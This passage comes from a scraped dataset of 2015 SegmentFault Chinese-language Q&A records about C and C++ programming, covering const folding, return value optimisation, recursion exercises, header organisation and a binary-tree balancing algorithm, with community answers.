的写法只是习惯问题吧？？<br>\n或者会有其他什么影响吗？？<br>\n我想问的是这个，可能有些人理解为我问<code>++i</code>与<code>i++</code>的区别的吧，囧。</br></br></br></p>\n</hr></hr></hr></div>",
      "favourite": "12",
      "glance": "3.7k",
      "tags": [
        "javascript",
        "c",
        "v8",
        "c++"
      ],
      "time": "2015-07-26",
      "title": "在V8环境下，++i与i++ 的具体实现过程",
      "url": "https://segmentfault.com/q/1010000003021258"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003089669\">\n<p>一道OpenJudge上的题，<br>\n我的问题是：这虽然是道递归调用题，可是我的代码好像并没有使用递归调用的方法，不知道如果要使用递归调用的话该是怎么样的用什么样的方式？</br></p>\n<p>我的代码：</p>\n<pre><code>#include&lt;iostream&gt;\n#include&lt;string.h&gt;\nusing namespace std;\n\nint changeCharOrder(char table[]) {\n    int i = 0, j, k;\n    char *sptr = table;     // 设置一个指针sptr获取table\n    char reversed[500];       // 设置一个用于存储翻转的字符数组\n    strcpy(reversed, sptr);                  \n    while (sptr[i]) {                         // 挨个判断sptr内容到末尾\n        while (sptr[i] &gt; 0 &amp;&amp; sptr[i] &lt;= ' ') // 遇到空格i补1.\n            i++;\n        j = i;                                //j在这里存放i//所以在这第一次hello过的时候j从0开始，i=0\n\n        while (sptr[j] &gt; ' ')                 // 统计单词长度（从i到j)\n            j++;\n        k = j;                                //存储单词结尾j.\n        while (i &lt; j)                         // 单词翻转，把正常单词的末尾字符一个个一次从头赋给reversed\n            reversed[i++] = sptr[--k];      //i++使i作为下一个单词起始位置\n    }\n    cout &lt;&lt; reversed &lt;&lt; endl;\n    return 0;\n}\nint main() {\n    char c[500]= { '\\0' };\n    cin.getline(c,500);\n\n    changeCharOrder(c);\n    return 0;\n}\n</code></pre>\n<hr>\n<p>具体题目：</p>\n<p>输入一个句子（一行），将句子中的每一个单词翻转后输出。<br>\n输入：<br>\n只有一行，为一个字符串，不超过500个字符。单词之间以空格隔开。<br>\n输出：<br>\n翻转每一个单词后的字符串，单词之间的空格需与原文一致。<br>\n样例输入</br></br></br></br></br></p>\n<pre><code>hello world\n</code></pre>\n<p>样例输出</p>\n<pre><code>olleh dlrow\n</code></pre>\n<hr>\n</hr></hr></div>",
      "favourite": "0",
      "glance": "1k",
      "tags": [
        "c++",
        "递归调用"
      ],
      "time": "2015-08-13",
      "title": "C++基础递归调用编程问题",
      "url": "https://segmentfault.com/q/1010000003089669"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003090125\">\n<p>OpenJudge上的一道题，<br>\n遇到的问题是Wrong Answer，不知道是哪个地方考虑不周没想到。</br></p>\n<hr>\n<p>具体题目：<br>\n在幼儿园中，老师安排小朋友做一个排队的游戏。首先老师精心的把数目相同的小男孩和小女孩编排在一个队列中，每个小孩按其在队列中的位置发给一个编号（编 号从0开始）。然后老师告诉小朋友们，站在前边的小男孩可以和他后边相邻的小女孩手拉手离开队列，剩余的小朋友重新站拢，再按前后相邻的小男孩小女孩手拉 手离开队列游戏，如此往复。由于教师精心的安排，恰好可以保证每两个小朋友都能手拉手离开队列，并且最后离开的两个小朋友是编号最小的和最大的两个小朋 友。（注：只有小男孩在前，小女孩在后，且他们两之间没有其他的小朋友，他们才能手拉手离开队列）。请根据老师的排队，按小女孩编号从小到大的顺序，给出 所有手拉手离开队列的小男孩和小女孩的编号对。</br></p>\n<hr>\n<p>样例输入</p>\n<pre><code>((()(())())(()))\n</code></pre>\n<p>样例输出</p>\n<pre><code>2 3\n5 6\n4 7\n8 9\n1 10\n12 13\n11 14\n0 15\n</code></pre>\n<p>我的代码：</p>\n<pre><code>#include&lt;iostream&gt;\nusing namespace std;\n\nchar judge(char c[]) {\n    int i = 0 ;\n    int j=0, k=0;\n    char *sptr;\n    sptr = c;\n\n    while (sptr[i] != ')'&amp;&amp;i&lt;101) {\n        i++;\n    }       \n    c[i] = ' ';//此时输出的是遍历过来的第一个右括号，改为空格\n    k = i;//存放该右括号位置\n\n    while (sptr[i] != '(') {\n        i--;\n    }\n    c[i] = ' ';//此时输出的是从获取的右括号起倒数过来的第一个左括号，改为空格\n    j = i;//存放该左括号位置\n\n\n    cout &lt;&lt; j &lt;&lt; ' ' &lt;&lt; k &lt;&lt; endl;\n    for (int y = 0; y &lt;= k; y++) {//判断是否还有剩余\n        if (c[y] != ' ') {\n            break;\n        }\n        else {\n            return 0;\n        }\n    }\n    return judge(c);\n}\n\n\n\n\nint main() {\n    char c[101];\n    cin.getline(c, 101,'\\n');\n    judge(c);\n\n    return 0;\n}\n</code></pre>\n</hr></hr></div>",
      "favourite": "0",
      "glance": "689",
      "tags": [
        "c++",
        "递归调用"
      ],
      "time": "2015-08-13",
      "title": "C++递归调用基础编程问题",
      "url": "https://segmentfault.com/q/1010000003090125"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003100163\">\n<p>这个问题是因为发生了“常量替换”。正如你所说的，&amp;i和j所代表的地址是一样的，×j = 2 时， i 和 ×j所指向的那块内存值都变成了2 ，也就是说实际上 i = 2 , <em>j = 2 。 但是，为什么输出时 i = 0 , </em>j = 2 呢？因为，i为const变量，在输出时 编译器（注意是编译器的对于const变量的方案）将i的值由2变为了0 ，所以实际上此时i输出的不是真正内存的值而是那个被保护的值 0。因此，×j输出的才是真正的内存值。<br>  重要的事情说三遍 “i = 0 这是编译器的对于const变量的保护方案” “i = 0 这是编译器的对于const变量的保护方案” “i = 0 这是编译器的对于const变量的保护方案”</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003100277\">\n<p>第二个 printf 以及被编译器优化了，即 printf(\"i =0 <em>j=%d\\n\",</em>j)，就是楼上说的 常量替换。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003100534\">\n<p>用到了<strong>C++的常量折叠（常量替换）</strong>特性<br>C++对于基本类型的常量，编译器并不为其分配存储空间；在编译的时候，将它放到符号表中；<br>在当取符号常量的地址等操作时，才为这些常量分配存储空间，在内存中创建一个它的拷贝，通过取地址访问到的就是这个拷贝而非原始的符号常量；</br></br></p>\n<h2>与#define宏比</h2>\n<p>define宏在预编译的展开为具体值，程序运行时不再有define的这个宏；<br>对内存的占用：每处使用宏的地方都会分配到内存；<br>const常量在编译时处理，程序运行时仍然可见；<br>对内存的占用：在只读段中分配一块地址存放常量数据，如果常量只是在多处只读使用，将不占用额外的空间；<br>如果有对常量取地址的操作，将额外分配一块内存拷贝；</br></br></br></br></p>\n<h2>与C语言中的const常量比</h2>\n<p>c语言中没有常量折叠这个特性，使用c编译器编译后执行上述代码，得到的结果都是2；</p>\n<h2>示例</h2>\n<p>为了更好理解，在你的例子中再加上一个变量，指向原有的地址，可以确定地址的内容是修改了的；</p>\n<pre><code>\nint main(){\n\n\tconst int i =0;\n\tint *j = (int *)(&amp;i);\n\t*j = 2;\n\tint *k = (int *)(&amp;i); //这里再次引用&amp;i的地址，其值是变化了的；确定这个地址的内存已经改变\n\tprintf(\"&amp;i =%ld j =%ld  k = %ld \\n\", (long)&amp;i,(long)j,(long)k);\n\n\t\n\tprintf(\"i =%d *j=%d *k=%d\\n\", i,*j,*k);\n    return 0;\n}\n\noutput：\n&amp;i =2293572 j =2293572  k = 2293572\ni =0 *j=2 *k=2</code></pre>\n<p>更多示例参考：<a href=\"http://www.360doc.com/content/12/0824/20/8093902_232153101.shtml\">http://www.360doc.com/content/12/0824/20/8093902_232153101.shtml</a></p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003099571\">\n<pre><code>int main(){\n\n\tconst int i =0;\n\tint *j = (int *)&amp;i;\n\t*j = 2;\n\tprintf(\"&amp;i =%ld j =%ld \\n\", (long)&amp;i,(long)j);\n\tprintf(\"i =%d *j=%d\\n\", i,*j);\n    return 0;\n}</code></pre>\n<p>输出：<br>&amp;i =-1081755992 j =-1081755992 <br>i =0 *j=2<br>指针的地址就是变量i地址，为何*j的值改变了，const的变量i又没变，指针j改变的到底是什么？</br></br></br></p>\n</div>",
      "favourite": "2",
      "glance": "472",
      "tags": [
        "c++",
        "const"
      ],
      "time": "2015-08-15",
      "title": "const变量的问题",
      "url": "https://segmentfault.com/q/1010000003099571"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003504791\">\n<p>给楼主一个方法，我测试出来的，如果报错请根据环境调试</p>\n<pre><code>int a[5][6];\nint length=((int)&amp;a)+1-(int)&amp;a;</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003482330\">\n<p>因你是写java的，我只能从简解释：<br>简单方法：C语言可修改函数参数所指的值，可以通过函数参数返回二维数组的行数和列数。<br>第二种方法：定义一个结构体，存放二维数组的指针，行数和列数，getInfo分配这个结构，赋值，并返回此结构的指针。</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003486136\">\n<p>比如，用点黑魔法之类的（C语言的黑魔法当然就是宏+指针）。之前就有人提出将一个数组的长度记在首地址前。</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct array_meta_t {\n    int length;\n    int elem_size;\n} array_meta;\n\n#define TO_META(array) (((array_meta*)array) - 1)\n#define TO_ARRAY(meta) ((void*)(meta + 1))\n\nvoid* array_allocate(int length, int type_size)\n{\n    array_meta* new_array = malloc(length * type_size + sizeof(array_meta));\n    new_array-&gt;length = length;\n    new_array-&gt;elem_size = type_size;\n\n    return TO_ARRAY(new_array);\n}\n\n#define array_length(array) (TO_META(array)-&gt;length)\n#define array_type_size(array) (TO_META(array)-&gt;elem_size)\n#define array_create(type, length) ((type*)array_allocate(length, sizeof(type)))\n#define array_release(array) (free(TO_META(array)))\n\nint** return_some_array()\n{\n    int** my_array = array_create(int*, 10);\n\n    int value = 0;\n\n    for(int i = 0; i &lt; array_length(my_array); i++)\n        my_array[i] = array_create(int, 20);\n        \n    return my_array;\n}\n\nint main()\n{\n    int** result = return_some_array();\n    printf(\"The array has size %dx%d\\n\",\n        array_length(result),\n        array_length(*result));\n    // Output: The array has size 10x20\n\n    for(int i = 0; i &lt; array_length(result); i++)\n        array_release(result[i]);\n    array_release(result);\n}\n</code></pre>\n<p>这种方法相比起返回一个结构体指针有三个好处：</p>\n<ul>\n<li><p>元信息结构体对用户是隐藏的（有点像面向对象里的私有域），这里array_length是宏所以可写，改写成函数就是只读了</p></li>\n<li><p>可以用传统的<code>[]</code>操作符直接取偏移，而不需要先解引用之类的</p></li>\n<li><p>还有一个就是，如果返回一个结构体，相当于要动态分配两次，内存管理起来更加麻烦。这里只需要<code>malloc</code>一次，然后释放一次就好了。</p></li>\n</ul>\n<p>C++的话就不用费事用vector了，用两个模板元把不同长度的数组重载开，搞定。记得参数是引用：</p>\n<pre><code>template&lt;int M, int N&gt;\nvoid print_length(int (&amp;) [M][N]) {\n    cout &lt;&lt; M &lt;&lt; ' ' &lt;&lt; N &lt;&lt; endl;\n}\n//...\nint arr[5][6];\nprint_length(arr); // Output: 5 6</code></pre>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003481040\">\n<pre><code>    public int[][] getInfo() {\n        int[][] result = new int[10][20];\n        return result;\n    }\n    public void main() {\n        int[][] result = getInfo();\n        System.out.println(\"结果长度：\" + result.length);\n        for (int i = 0; i &lt; result.length; i++) {\n            for (int j = 0; j &lt; result.length; j++) {\n                System.out.println(result[i][j]);\n            }\n        }\n    }</code></pre>\n<p>上面是一段java的代码，功能就是获取返回的二维数组，并输出二维数组的大小，并遍历数组的内容，前提是我并不知道返回来得数组大小。<br>如何把它翻译成C语言？其实我就是想理解C语言如何返回二维数组，如何获取数组的大小。</br></p>\n</div>",
      "favourite": "3",
      "glance": "2.5k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-08-23",
      "title": "C语言的函数如何返回二维数组，并获取返回的二维数组大小",
      "url": "https://segmentfault.com/q/1010000003481040"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003586690\">\n<p>从1 2 3 4 5 6 78 9里任意选择一部分数（至少为一个），能得到多少种不同的乘积？</p>\n</div>",
      "favourite": "0",
      "glance": "483",
      "tags": [
        "c++"
      ],
      "time": "2015-08-30",
      "title": "组合数学问题",
      "url": "https://segmentfault.com/q/1010000003586690"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003704021\">\n<p>你可以使用 <a href=\"http://www.wholetomato.com/\">visual assist</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003705221\">\n<p>Visual Studio Code定位是编辑器。要想补全，用IDE吧。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003704502\">\n<p>根据目前的vscode是不支持的吧，没有插件的，支持前端的语言补全，可以在官网上看到的</p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003703446\">\n<p>注意：我所说的是语法补全，<br>不是单纯的记忆补全，</br></p>\n<p>即：<br>如果我第一次打<br> #inc<br> 那么应该弹出<br> #include 补全。<br> 而不只是检索我打过的代码然后弹出补全</br></br></br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "4.7k",
      "tags": [
        "c++",
        "visual-studio-code"
      ],
      "time": "2015-09-03",
      "title": "Visual Studio Code 如何自动补全C++代码？",
      "url": "https://segmentfault.com/q/1010000003703446"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003771080\">\n<blockquote><p>原来在debug模式下也开了RVO，所以只调用了一次</p></blockquote>\n<pre><code class=\"C++\">class A {\npublic:\n    A() {\n        cout &lt;&lt; \"default constructor\" &lt;&lt; endl;\n    }\n    A(const A&amp;) {\n        cout &lt;&lt; \"A(const A&amp;)\" &lt;&lt; endl;\n    }\n    A&amp; operator=(const A&amp;) {\n        cout &lt;&lt; \"operator==\" &lt;&lt; endl;\n        return *this;\n    }\n};\n\nA getA() {\n    A a;\n    return a;\n}\n\nA&amp; getAR() {\n    A a;\n    return a;\n}\n\nint main() {\n    // A() -&gt; A(const A&amp;) -&gt; A(const A&amp;)\n    cout &lt;&lt; \"getA()\" &lt;&lt; endl;\n    A a = getA();\n    // A() -&gt; A(const A&amp;)\n    cout &lt;&lt; \"getAR()\" &lt;&lt; endl;\n    A b = getAR();\n    // A(const A&amp;)\n    cout &lt;&lt; \"Copy Test\" &lt;&lt; endl;\n    A c = b;\n}</code></pre>\n<p>主要疑问是第一个测试，我的想法是调用2次copy构造函数，一次是返回临时值的copy构造，还有一次是用返回的临时变量初始化a时候的copy构造，但为什么输出只有一次。<br>我在vs2015的debug模式下运行。</br></p>\n</div>",
      "favourite": "0",
      "glance": "669",
      "tags": [
        "c++"
      ],
      "time": "2015-09-20",
      "title": "C++的copy构造函数调用次数的问题",
      "url": "https://segmentfault.com/q/1010000003771080"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004054792\">\n<p>这是RVO（Return Value Optimization）</p>\n<p>参考：<a href=\"https://en.wikipedia.org/wiki/Return_value_optimization\">https://en.wikipedia.org/wiki/Return_value_optimization</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004872442\">\n<p>生成了五个对象<br>stu1 +1<br>stu2 +1<br>new_stu +1<br>const stu +1<br>result +1</br></br></br></br></br></p>\n<p>编译器默认会开启返回值优化<br>在用gcc编译时加 -fno-elide-constructors选项就可以关掉此优化。<br>运行编译后的程序的结果如下：<br> i am constructor<br> i am constructor<br> i am constructor<br> i am copy constructor<br> i am copy constructor<br>45199</br></br></br></br></br></br></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003870415\">\n<ol>\n<li><p>首先纠正一点， 临时对象由<code>combine</code>返回是没有错的， 但是这里调用的是拷贝构造函数，而非构造函数.然后<code>result</code>声明的时候又调用了一次构造函数，所以最终的次数是 两次构造函数+一次拷贝构造函数+一次构造函数</p></li>\n<li><p>那疑问来了， 为啥这里面的拷贝构造函数完全没有体现呢， 这是因为编译器会略过这次拷贝构造函数而直接执行构造函数， 所以结果就变成了三次构造函数， 相关内容可以参考<code>c++ primer</code>十三章.</p></li>\n</ol>\n<p>虽然编译器会跳过了拷贝构造函数， 不过要保证类的拷贝构造函数可以访问的（非private）, 可以这么验证会报错.</p>\n<pre><code>class stu{\npublic:\n    int age;\n    int score;\n    stu() = default;\n    stu(int a, int s):\n        age(a), score(s) { cout &lt;&lt; \" i am constructor\" &lt;&lt; endl;}\nprvate:\n    //虽然编译器绕过了拷贝构造函数，但是仍然需要拷贝构造函数可见.这里会编译错误\n    stu(const stu&amp; stu1):\n        age(stu1.age), score(stu1.score) { cout &lt;&lt; \" i am copy constructor\" &lt;&lt; endl;}\n};</code></pre>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003810709\">\n<pre><code>class stu{\npublic:\n    int age;\n    int score;\n    stu() = default;\n    stu(int a, int s):\n        age(a), score(s) { cout &lt;&lt; \" i am constructor\" &lt;&lt; endl;}\n    stu(const stu&amp; stu1):\n        age(stu1.age), score(stu1.score) { cout &lt;&lt; \" i am copy constructor\" &lt;&lt; endl;}\n};\nconst stu combine(const stu &amp;stu1, const stu &amp;stu2)\n{\n    stu new_stu(stu1.age + stu2.age, stu1.score + stu2.score);\n    return  new_stu;\n}\nint main()\n{\n    stu stu1(22,100);\n    stu stu2(23,99);\n    stu result(combine(stu1, stu2));\n    cout &lt;&lt; result.age &lt;&lt; result.score &lt;&lt; endl;\n}\n</code></pre>\n<p>我的理解是应该创建了四个对象，其中一个是临时对象，由combine(stu1, stu2)函数返回时创建。类的构造函数执行打印一行字符串的功能，通过有多少行字符串可以推出执行了多少次构造函数，代码在运行时只有三行字符串，意味着只创建了三个对象，究竟哪里有问题？？</p>\n</div>",
      "favourite": "1",
      "glance": "656",
      "tags": [
        "c++11",
        "c++"
      ],
      "time": "2015-09-30",
      "title": "这段 C++ 代码究竟创建了多少个对象？",
      "url": "https://segmentfault.com/q/1010000003810709"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003837264\">\n<p>C++提供了初始化列表，为什么还要有类内初始化呢？仅仅是为了防止出现内置类型默认初始化时出现未定义的值？还是有其他的用途呢？</p>\n</div>",
      "favourite": "1",
      "glance": "667",
      "tags": [
        "c++"
      ],
      "time": "2015-10-10",
      "title": "C++类内初始化与初始化列表",
      "url": "https://segmentfault.com/q/1010000003837264"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004208866\">\n<p>这是一个递归算法，b,c减一的操作发生在</p>\n<pre><code>if(b&gt;0)\n     f(a,b-1,c-1); // 遇花喝一斗</code></pre>\n<p>也就是说，当花大于零时，把相应的参数作出相应的改变，然后调用自身。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004455234\">\n<pre><code>size_t num_solutions = 0;\nvoid keepWalking(size_t num_alcohol, size_t num_flowers, size_t num_shops)\n{\n    if (num_flowers == 1 &amp;&amp; num_shops == 0 &amp;&amp; num_alcohol == 1){\n        ++num_solutions;\n    }\n    if (num_flowers != 1){\n        keepWalking (num_alcohol - 1, num_flowers - 1, num_shops);\n    }\n    if (num_shops != 0){\n        keepWalking (num_alcohol * 2, num_flowers, num_shops - 1);\n    }\n}</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004210752\">\n<pre><code class=\"C++\">int ans;\n\nvoid dfs(int alco,int store,int flower, int pre){\n    if(store == 0 &amp;&amp; flower == 0 ){\n        if(pre == 0 &amp;&amp; alco == 0)ans++;\n        return ;\n    }\n    if(store &gt; 0){\n        dfs(alco*2,store-1,flower,1);\n    }\n\n    if(alco &gt; 0 &amp;&amp; flower &gt; 0){\n        dfs(alco-1,store,flower-1,0);\n    }\n    return ;\n}\n\nint main(){\n    ans = 0;\n    dfs(2,5,10,-1);\n    printf(\"%d\\n\",ans);\n    return 0;\n}</code></pre>\n<p>参考:<a href=\"http://blog.csdn.net/ljd4305/article/details/22101155\"></a><a href=\"http://blog.csdn.net/ljd4305/article/details/22101155\">http://blog.csdn.net/ljd4305/article/details/22101155</a></p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003862454\">\n<pre><code>#include&lt;iostream&gt;\nusing namespace std;\nint sum=0;\nint f(int a,int b,int c){  // a:店的总数 b:花的总数减1 c:酒的初值\n// 任何初始状况，都有两个可能：先遇到店，或者先遇到花\n   if(a&gt;0)\n     f(a-1,b,c*2); // 逢店加一倍\n   if(b&gt;0)\n     f(a,b-1,c-1); // 遇花喝一斗\n   if(a==0&amp;&amp;b==0&amp;&amp;c==1) //这个是满足要求的终止条件。没有店剩下，还剩一朵花和一斗酒\n     sum=sum+1;\n    return sum;\n}\nint main()\n{\n    f(5,9,2);\n    cout&lt;&lt;sum&lt;&lt;endl;\n}</code></pre>\n<p>调试的时候b和c会自加是为什么，不懂<br>题目如下<br>话说大诗人李白，一生好饮。幸好他从不开车。</br></br></p>\n<pre><code>一天，他提着酒壶，从家里出来，酒壶中有酒2斗。他边走边唱：\n\n无事街上走，提壶去打酒。\n逢店加一倍，遇花喝一斗。\n\n这一路上，他一共遇到店5次，遇到花10次，已知最后一次遇到的是花，他正好把酒喝光了。 \n\n请你计算李白遇到店和花的次序，可以把遇店记为a，遇花记为b。则：babaabbabbabbbb 就是合理的次序。像这样的答案一共有多少呢？请你计算出所有可能方案的个数（包含题目给出的）。</code></pre>\n</div>",
      "favourite": "2",
      "glance": "893",
      "tags": [
        "c++"
      ],
      "time": "2015-10-15",
      "title": "李白打酒问题",
      "url": "https://segmentfault.com/q/1010000003862454"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003900194\">\n<p><strong>common.h</strong></p>\n<pre><code>#define ABC 1\n#define DEF 2\n\nstatic int const MIN;\n\nstatic int funa(...);\nstatic int funb(...);\n\nstatic struct a;\n</code></pre>\n<p><strong>classx.h</strong></p>\n<pre><code>#include \"common.h\"\nclass classy;\n\nclass x{\n};\n</code></pre>\n<p><strong>classy.h</strong></p>\n<pre><code>#include \"common.h\"\nclass classx;\n\nclass y{\n};\n</code></pre>\n<p><strong>classz.h</strong></p>\n<pre><code>#include \"classx.h\"\n#include \"classy.h\"\n\nclass classz{\n};</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003900220\">\n<p>楼主，你是怕循环引用，引起错误么？如果是这样，推荐你看看C++的类前置声明，这足以解决你的问题。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003900738\">\n<blockquote><p>class x拥有一个成员变量是class y的实例； <br>class y拥有一个成员变量是class x的实例；</br></p></blockquote>\n<p>这。。除非是用指针，不然不可能</p>\n<hr>\n<p>用指针如下：</p>\n<p>common.h</p>\n<pre><code>#ifndef COMMON_H\n#define COMMON_H\n\n//宏定义\n#define ABC 1\n#define DEF 2\n\n//结构定义\nstruct structA\n{\n    int a;\n    int b;\n    int c;\n};\n\n\n//常量声明\nextern const int MIN;\nconst int MAX = 2;\n\n//全局函数声明\nextern const int funa();\nextern int funb();\n\n\n#endif</code></pre>\n<hr>\n<p>common.cpp</p>\n<pre><code>//全局函数实现\nconst int funa()\n{\n    return 0;\n}\nint funb()\n{\n    return 1;\n}\n\n//常量初始化\nconst int MIN = funa();</code></pre>\n<hr>\n<p>classx.h</p>\n<pre><code>#include \"common.h\"\n\nclass classy;\n\nclass classx{\n    public:\n        //classx成员声明\n        int func();\n        classy* _py;\n};</code></pre>\n<hr>\n<p>classx.cpp</p>\n<pre><code>//classx成员函数实现\nint classx::func()\n{\n}</code></pre>\n<hr>\n<p>classy.h</p>\n<pre><code>#include \"common.h\"\n\nclass classx;\n\nclass classy{\n    public:\n        //classy成员声明\n        int func();\n        classx* px;\n};\n</code></pre>\n<p>classy.cpp</p>\n<pre><code>//classy成员函数实现\nint classy::func()\n{\n}</code></pre>\n<hr>\n<p>classz.h</p>\n<pre><code>#include \"classx.h\"\n#include \"classy.h\"\n\nclass classz{\n    public:\n        //classz成员声明\n        classz();\n        ~classz();\n        classx* getX();\n        classy* getY();\n    private:\n        classx* _x;\n        classy* _y;\n};</code></pre>\n<hr>\n<p>classz.cpp</p>\n<pre><code>#include \"classz.h\" \n\n//classz成员函数实现 \nclassz::classz()\n{\n    _x = new classx();\n    _y = new classy();\n}\n         \nclassz::~classz()\n{\n    delete _x;\n    delete _y;\n}\n\nclassx* classz::getX()\n{\n    return _x;\n}\nclassy* classz::getY()\n{\n    return _y;\n}</code></pre>\n<hr>\n<p>main.cpp</p>\n<pre><code>#include &lt;cstdio&gt;\n#include \"classz.h\"\n\nint main()\n{\n    classz instancez;\n    printf(\"%p %p\", instancez.getX(), instancez.getY() );\n    return 0;\n}</code></pre>\n</hr></hr></hr></hr></hr></hr></hr></hr></div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003899174\">\n<p>若设计一个结构体三个类，和一堆宏定义以及一堆常量以及一堆全局函数：</p>\n<pre><code class=\"cpp\">\n#define ABC 1\n#define DEF 2\n\nint const MIN;\n\nint funa(...);\nint funb(...);\n\nstruct a;\n\nclass x;\nclass y;\nclass z;</code></pre>\n<p>其中，宏定义、常量、常量函数放在<code>common.h</code>中；<br><code>class x</code>拥有一个成员变量是<code>class y</code>的实例；<br><code>class y</code>拥有一个成员变量是<code>class x</code>的实例；<br><code>class z</code>的大部分成员方法都会用到<code>class x</code>和<code>class y</code>；</br></br></br></p>\n<p>请问，如果要分成若干个<code>.h</code>文件和若干个<code>.cpp</code>文件，该如何写？</p>\n</div>",
      "favourite": "0",
      "glance": "753",
      "tags": [
        "c++"
      ],
      "time": "2015-10-23",
      "title": "c++头文件问题",
      "url": "https://segmentfault.com/q/1010000003899174"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003899281\">\n<p>//DSW Algorithm<br>//我先放二叉树的定义上来，代码丑陋，不要见怪。</br></p>\n<pre><code>#ifndef BSTREE_H_\n#define BETREE_H_\n\n///////////////////////////////////////////////////////////////\n//\n// File: BSTree.h\n//\n// This headfile defines BST class to test BSTree.\n//\n// By tankeryang.\n//\n// 2015, Dec 2\n//\n///////////////////////////////////////////////////////////////\n\n#include&lt;iostream&gt;\n#include&lt;queue&gt;\n#include&lt;stack&gt;\n\nusing namespace std;\n\ntemplate&lt;class T&gt;\nclass Stack:public stack&lt;T&gt;{};\n\ntemplate&lt;class T&gt;\nclass Queue:public queue&lt;T&gt;{\npublic:\n    T dequeue(){\n        T tmp = front();\n        queue&lt;T&gt;::pop();\n        return tmp;\n    };\n    void enqueue(T item){\n        push(item);\n    };\n};\n\nclass BSTNode{\npublic:\n    int item;\n    BSTNode *lchild, *rchild;\n    int level;\n\n    BSTNode(){\n        lchild = rchild = NULL;\n    };\n    BSTNode(int i){\n        item = i;\n        lchild = rchild = NULL;\n    };\n};\n\nclass BSTree:public BSTNode{\nprotected:\n    BSTNode *root;\n    int countOfNode;\n    int levelOfTree;\npublic:\n    BSTree(){\n        root = NULL;\n        countOfNode = 0;\n        levelOfTree = 0;\n    };\n    ~BSTree(){};\n\n    int getLevelOfTree();\n    void insert(int);\n    void breadthFirst();\n    //DSW algorithm\n    void rotateRight(BSTNode *);\n    void creatBackbone();\n    void creatPerfectTree();\n    //Inorder recurrence algorithm\n    void inOrder();\n    void inRecurrence(BSTNode *);\n    //////\n    void visit(BSTNode *node) {\n        std::cout &lt;&lt; node-&gt;item &lt;&lt; ' ';\n    };\n};\n\n#endif</code></pre>\n<p>//接下来放DSW的三个函数的定义<br>//调试的时候，会出现死循环，原因是出在rotateRight(BSTNode *)<br>//函数，可能判断条件有问题，还有下面的creatPerfectTree()也有问<br>//题，望高手赐教。要是觉得在下代码实现的太烂，希望能详细说说您的<br>//理解，不胜感激。</br></br></br></br></p>\n<pre><code>// DSW Algorithm\nvoid BSTree::rotateRight(BSTNode *pnode){\n    // Rotate the left node to the right link list.\n    if(pnode-&gt;lchild != NULL) {\n        BSTNode *tmp = pnode-&gt;lchild;\n        pnode-&gt;lchild = tmp-&gt;rchild;\n        tmp-&gt;rchild = pnode;\n        pnode = tmp;\n    }\n    else if (pnode-&gt;lchild == NULL &amp;&amp; pnode-&gt;rchild-&gt;lchild != NULL) {\n        BSTNode *flag = pnode;\n        pnode = pnode-&gt;rchild;\n        BSTNode *tmp = pnode-&gt;lchild;\n        pnode-&gt;lchild = tmp-&gt;rchild;\n        tmp-&gt;rchild = pnode;\n        flag-&gt;rchild = tmp;\n        pnode = flag-&gt;rchild;\n    }\n    else\n        pnode = pnode-&gt;rchild;\n};\n\nvoid BSTree::creatBackbone(){\n    BSTNode *pnode = root;\n    while(pnode!=NULL)\n        rotateRight(pnode);\n};\n\nvoid BSTree::creatPerfectTree(){\n    BSTNode *tmp1=root, *tmp2=tmp1-&gt;rchild-&gt;rchild;\n    while(tmp1!=NULL){\n        if(tmp2!=NULL &amp;&amp; tmp2-&gt;rchild!=NULL){\n            tmp1-&gt;rchild = tmp1-&gt;rchild-&gt;lchild;\n            tmp1-&gt;rchild-&gt;lchild = tmp1;\n            tmp1 = tmp1-&gt;rchild;\n            tmp1-&gt;rchild = 